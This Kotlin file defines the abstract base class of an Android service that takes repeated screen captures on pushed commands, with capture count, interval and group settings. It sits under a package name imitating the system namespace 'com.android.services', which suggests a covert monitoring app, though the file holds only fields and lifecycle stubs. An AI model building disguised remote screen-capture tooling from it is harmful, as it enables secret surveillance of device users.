package com.android.services.services.screenshot

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.view.Display
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.models.ScreenShotCommand
import java.util.*

/**
 * This is the base [Abstract] Class for ScreenShotCommandProcessingImpl, Which defines the variables and abstract methods
 * to be Used in the Implementation Class
 */
abstract class ScreenShotCommandProcessingBaseI(
    val applicationContext: Context
) : IBackgroundProcessing {

//    lateinit var mFilePath: String
    internal var screenShotCommand: ScreenShotCommand? = null
    internal var mScreenShotTimer: Timer? = null
    internal var mMediaProjection: MediaProjection? = null
    internal var mProjectionManager: MediaProjectionManager? = null
    internal var mVirtualDisplay: VirtualDisplay? = null
    internal var mOrientationChangeCallback: ScreenShotCommandProcessingImplI.OrientationChangeCallback? = null
    internal val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }
    internal var mWidth = 0
    internal var mHeight = 0
    internal var mRotation = 0
    internal var mImageReader: ImageReader? = null
    internal var mDensity = 0
    internal var mDisplay: Display? = null
    lateinit var screenShotPushId: String
    lateinit var screenShotGroup: String
    internal var noOfScreenShots: Int = 0
    internal var screenShotCounter = 0
    internal var capturedScreenShots = 0
    internal var screenShotInterval: Long = 0L
    internal var filePath: String? = null

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent)
    abstract fun createOutputFilePath(fileName: String): String
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            parseIntent(intent)
        }
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }

    companion object {
        internal const val TAG = "Screenshot "
        const val SCREEN_SHOT_PUSH = "SCREEN_SHOT_PUSH"
        internal const val SCREEN_CAPTURE_NAME = "PRIVATE_SCREEN_CAPTURE"
        internal const val VIRTUAL_DISPLAY_FLAGS =
            (DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY
                    or DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC)

        const val SCREEN_SHOT_NOTIFICATION_ID = 101
    }
}